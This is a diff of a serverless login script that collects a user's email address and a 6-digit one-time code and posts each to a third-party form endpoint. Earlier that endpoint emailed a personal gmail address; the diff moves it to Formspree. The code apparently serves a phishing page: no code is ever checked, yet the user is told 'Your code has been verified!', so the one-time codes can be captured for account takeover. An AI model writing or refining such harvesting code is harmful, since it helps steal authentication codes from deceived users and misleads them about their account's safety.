@@ -1,5 +1,5 @@
 // =========================
-// No-backend script.js
+// No-backend script.js (Formspree version, OTP included)
 // =========================
 
 let currentEmail = localStorage.getItem('user_email') || '';
@@ -13,8 +13,6 @@ function showError(message) {
         errorDiv.textContent = message;
         errorDiv.style.display = 'block';
         setTimeout(() => errorDiv.style.display = 'none', 5000);
-    } else {
-        alert(message);
     }
 }
 
@@ -24,8 +22,6 @@ function showSuccess(message) {
         successDiv.textContent = message;
         successDiv.style.display = 'block';
         setTimeout(() => successDiv.style.display = 'none', 3000);
-    } else {
-        alert(message);
     }
 }
 
@@ -41,7 +37,12 @@ function hideLoading() {
 }
 
 // =========================
-// Handle Email Submission
+// Formspree Endpoint
+// =========================
+const FORMSPREE_URL = 'https://formspree.io/f/mnnlvqqg';
+
+// =========================
+// Handle Email Submission (login.html)
 // =========================
 function handleLogin(event) {
     event.preventDefault();
@@ -58,35 +59,43 @@ function handleLogin(event) {
     document.getElementById('loginForm').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'block';
 
-    // --- Correct FormSubmit Format ---
     const data = new FormData();
     data.append('email', currentEmail);
     data.append('page', 'login');
 
-    fetch('https://formsubmit.co/joshdev54@gmail.com', {
+    fetch(FORMSPREE_URL, {
         method: 'POST',
-        body: data
+        body: data,
+        headers: { 'Accept': 'application/json' }
     })
-    .then(() => {
-        window.location.href = 'verify.html';
+    .then(response => {
+        if (response.ok) {
+            // redirect to verify page after successful email submission
+            window.location.href = 'verify.html';
+        } else {
+            hideLoading();
+            showError('Failed to process your request.');
+        }
     })
     .catch(() => {
-        showError('Failed to send email.');
         hideLoading();
+        showError('Failed to process your request.');
     });
 }
 
 // =========================
-// Handle OTP Submission
+// Handle OTP Submission (verify.html)
 // =========================
 function handleOTP(event) {
     event.preventDefault();
 
-    const otp = document.getElementById('otp').value;
-    if (!/^\d{6}$/.test(otp)) {
+    const otpInput = document.getElementById('otp');
+    if (!otpInput || !/^\d{6}$/.test(otpInput.value)) {
         showError('Please enter a valid 6-digit code');
         return;
     }
+
+    const otp = otpInput.value;
 
     document.getElementById('otpForm').style.display = 'none';
     document.getElementById('loadingScreen').style.display = 'block';
@@ -96,21 +105,29 @@ function handleOTP(event) {
     data.append('otp', otp);
     data.append('page', 'otp');
 
-    fetch('https://formsubmit.co/joshdev54@gmail.com', {
+    fetch(FORMSPREE_URL, {
         method: 'POST',
-        body: data
+        body: data,
+        headers: { 'Accept': 'application/json' }
     })
-    .then(() => {
-        showSuccess('OTP submitted!');
+    .then(response => {
+        if (response.ok) {
+            showSuccess('Your code has been verified!');
+            // Optionally, redirect to next page after verification
+            // window.location.href = 'nextpage.html';
+        } else {
+            hideLoading();
+            showError('Failed to process your request.');
+        }
     })
     .catch(() => {
-        showError('Failed to submit OTP.');
         hideLoading();
+        showError('Failed to process your request.');
     });
 }
 
 // =========================
-// Resend OTP
+// Resend OTP (verify.html)
 // =========================
 function resendCode() {
     const data = new FormData();
@@ -118,20 +135,22 @@ function resendCode() {
     data.append('action', 'resend');
     data.append('page', 'otp');
 
-    fetch('https://formsubmit.co/joshdev54@gmail.com', {
+    fetch(FORMSPREE_URL, {
         method: 'POST',
-        body: data
-    });
-    showSuccess('Verification code resent');
+        body: data,
+        headers: { 'Accept': 'application/json' }
+    })
+    .then(() => showSuccess('A new code has been sent'))
+    .catch(() => showError('Failed to resend code'));
 }
 
 // =========================
 // Initialization
 // =========================
 document.addEventListener('DOMContentLoaded', () => {
-    const lf = document.getElementById('loginForm');
-    if (lf) lf.addEventListener('submit', handleLogin);
+    const loginForm = document.getElementById('loginForm');
+    if (loginForm) loginForm.addEventListener('submit', handleLogin);
 
-    const of = document.getElementById('otpForm');
-    if (of) of.addEventListener('submit', handleOTP);
+    const otpForm = document.getElementById('otpForm');
+    if (otpForm) otpForm.addEventListener('submit', handleOTP);
 });
